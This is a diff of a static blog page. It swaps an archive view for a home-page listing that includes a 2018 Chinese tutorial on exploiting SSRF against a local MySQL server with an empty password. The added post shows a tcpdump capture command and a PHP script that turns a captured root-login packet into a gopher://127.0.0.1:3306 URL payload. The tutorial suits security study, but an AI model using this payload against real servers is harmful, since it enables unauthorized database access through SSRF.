@@ -82,7 +82,7 @@
 <meta name="description" content="一束光照进了铁塔，塔里的肮脏龌龊被显现，这束光便有了罪。">
 <meta property="og:type" content="website">
 <meta property="og:title">
-<meta property="og:url" content="http://yangge.me/archives/2019/04/index.html">
+<meta property="og:url" content="http://yangge.me/page/3/index.html">
 <meta property="og:site_name">
 <meta property="og:description" content="一束光照进了铁塔，塔里的肮脏龌龊被显现，这束光便有了罪。">
 <meta property="og:locale" content="Zh/Cn">
@@ -118,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="http://yangge.me/archives/2019/04/"/>
+  <link rel="canonical" href="http://yangge.me/page/3/"/>
 
 
 
 
 
-  <title>Archive | </title>
+  <title></title>
   
 
 
@@ -143,7 +143,8 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left 
+  page-home">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -216,74 +217,149 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-
-  
-  
-  
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
-
-      <span class="archive-page-counter">
-        
-        
-        
-          
-        
-        Um..! 21 posts in total. Keep on posting.
-      </span>
-
+  <section id="posts" class="posts-expand">
+    
       
 
-        
-        
-        
+  
 
-        
-          
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2019">2019</h1>
-          </div>
-        
-        
-
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yangge.me/2018/01/26/ssrf-本地MySQL空密码的利用/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="yangge">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2019/04/24/域名前置-Domain-Fronting/" itemprop="url">
-              
-                <span itemprop="name">域名前置(Domain Fronting)</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/01/26/ssrf-本地MySQL空密码的利用/" itemprop="url">ssrf+本地MySQL空密码的利用</a></h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2019-04-24T11:11:19+08:00"
-              content="2019-04-24" >
-          04-24
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-26T14:53:43+08:00">
+                2018-01-26
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
 
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/01/26/ssrf-本地MySQL空密码的利用/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/01/26/ssrf-本地MySQL空密码的利用/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>首先我们要在本地进行利用wireshark抓取一下mysql空密码的数据包。<br>mysql要使用TCP/IP协议进行连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h127.0.0.1 -uroot</span><br></pre></td></tr></table></figure></p>
+<p>然后使用tcpdump进行抓取数据包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump –i lo port 3306 –w mysql.pcay</span><br></pre></td></tr></table></figure>
+<p>对抓取到的数据包进行查看，使用wireshark查看<br><img src="https://i.loli.net/2018/01/26/5a6ad2dcacfd0.png" alt=""><br>查看一条数据，数据查看方式选择TCP流，选择方式如下图<br><img src="https://i.loli.net/2018/01/26/5a6ad4e079521.png" alt=""><br>这个数据然后再进行因为是tcp流的，我们需要对其进行每两个字符添加%进行url编码，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;a800000185a6ff0100000001210000000000000000000000000000000000000000000000757365726e6f7061737300006d7973716c5f6e61746976655f70617373776f72640065035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404333630390f5f636c69656e745f76657273696f6e06352e372e3231095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420310100000001&quot;;</span><br><span class="line">for($i=0;$i&lt;=strlen($url);$i=$i+3)</span><br><span class="line">&#123;</span><br><span class="line">	$url = substr_replace($url,&apos;%&apos;,$i,0);</span><br><span class="line">&#125;</span><br><span class="line">$url_gopher = &quot;gopher://127.0.0.1:3306/_&quot; . $url;</span><br><span class="line">echo $url_gopher . &quot;\r\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后进行利用<br><img src="https://i.loli.net/2018/01/26/5a6ad4e07add5.png" alt=""></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
 
       
 
-    </div>
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
   </div>
   
   
   
+  </article>
+
+
+    
+  </section>
 
   
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+  </nav>
 
 
 
